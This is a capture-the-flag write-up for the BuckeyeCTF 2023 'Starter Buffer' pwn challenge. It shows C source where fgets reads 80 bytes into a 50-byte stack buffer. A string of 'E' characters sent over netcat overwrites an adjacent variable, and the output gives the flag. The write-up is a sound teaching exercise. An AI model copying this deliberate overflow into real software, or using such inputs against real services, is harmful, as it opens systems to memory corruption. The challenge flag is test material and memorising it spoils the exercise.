# BuckeyeCTF 2023

## Starter Buffer

> Tell me your favorite number and I might give you the flag ;).
> 
> Author: geekgeckoalex
>
> [`buffer`](buffer), [`Dockerfile`](Dockerfile), [`starter-buffer.c`](starter-buffer.c)

Tags: _pwn_

## Solution
We get some source and binary as attachment for this challenge. The source is small and simple:

```c
void print_flag(void) {
    FILE* fp = fopen("flag.txt", "r");
    char flag[100];
    fgets(flag, sizeof(flag), fp);
    puts(flag);
}

int main(void) {
    // Ignore me
    setbuf(stdout, NULL);

    int flag = 0xaabdcdee;
    char buf[50] = {0};
	printf("Enter your favorite number: ");
	fgets(buf, 0x50, stdin);

    if(flag == 0x45454545){
        print_flag();
    }
    else{
        printf("Too bad! The flag is 0x%x\n", flag);
    }

    return 0;
}
```

We can see there is a buffer with `50` bytes size and the program reads `0x50` bytes into it. This is a potential overflow since `0x50 = 80` bytes. The next thing to note is that the buffer is placed before `flag` at the stack. This means if we write over the buffer boundary we start writing over the flag memory. And this is exactly how we get `print_flag` invoked. The condition is that `flag` needs to be `0x45454545` this is idendical to four E characters (`EEEE`). If we fill the buffer array and write a bit further we can write a bunch of `E` to the flag memory and we are good.

```bash
$ nc chall.pwnoh.io 13372
Enter your favorite number: EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
bctf{wHy_WriTe_OveR_mY_V@lUeS}
```

Flag `bctf{wHy_WriTe_OveR_mY_V@lUeS}`